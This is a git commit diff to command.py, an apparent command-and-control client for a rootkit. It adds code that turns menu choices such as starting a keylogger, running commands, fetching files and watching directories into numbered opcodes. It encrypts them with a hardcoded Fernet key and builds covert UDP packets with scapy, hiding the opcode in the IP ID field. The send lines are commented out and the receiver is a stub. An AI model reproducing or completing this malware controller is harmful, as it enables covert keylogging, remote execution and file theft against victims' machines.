a5bf6f53ab74d51bb993c094649884ba65830f08
Bryan <b.r.hill@outlook.com>
2022-11-09 18:01:28 -0800

    Command Sender Almost Completed

--- command.py
+++ command.py
@@ -1,9 +1,20 @@
 import os
+import struct
+import time
+
+from cryptography.fernet import Fernet
+
+from encryption import encryption
+
+from scapy.all import *
+from scapy.layers.inet import IP, UDP
+
+key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
 
 
 def main():
     # ip = input("Enter backdoor IP: ")
-    ip = "fauxip"
+    ip = "192.168.1.26"
     controller = c2(ip)
     if controller.connect():
         while True:
@@ -58,6 +69,7 @@ def menu_parse(option, controller):
 class c2:
     def __init__(self, ip):
         self.kit_ip = ip
+        self.encrypter = encryption(key)
 
     def connect(self):
         print("connect to rootkit")
@@ -67,22 +79,28 @@ class c2:
         match opt:
             case 0:
                 print("Start keylogger")
+                self.command_sender(1, "blankdata")
             case 1:
                 print("Stop keylogger")
+                self.command_sender(2, "blankdata")
             case _:
                 print("Error")
 
     def opt_execute(self, opt):
+        self.command_sender(3, opt)
         print(opt)
 
     def opt_file_get(self, opt):
+        self.command_sender(4, opt)
         print(opt)
 
     def opt_file_watch(self, opt, file):
         match opt:
             case 0:
+                self.command_sender(5, opt)
                 print("Start watching file "+file)
             case 1:
+                self.command_sender(6, opt)
                 print("Stop watching file "+file)
             case _:
                 print("Error")
@@ -90,14 +108,30 @@ class c2:
     def opt_directory(self, opt, directory):
         match opt:
             case 0:
+                self.command_sender(7, directory)
                 print("Start watching directory "+directory)
             case 1:
+                self.command_sender(8, directory)
                 print("Stop watching directory "+directory)
             case _:
                 print("Error")
 
     def disconnect(self):
         print("disconnect from rootkit")
+
+    # WILL BE DOING AS SINGLE PORT, OPTION IN ID, INSTRUCTIONS IN DATA
+    # Example stopping keylog: port 52 (arbitrary right now), ID=XXX2 (last digit as 2),
+    def command_sender(self, opt, data):
+        rand_id = int(str(random.randrange(100, 999)) + str(opt))
+        port = 5000
+        encrypted_data = self.encrypter.encrypt(data)
+        # s = struct.pack('bb', dchar, dchar1)
+        #dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port) / encrypted_data)
+        #send(dgram, verbose=0)
+
+    # http.server module?
+    def results_receiver(self):
+        print("receive http")
 
 
 if __name__ == '__main__':
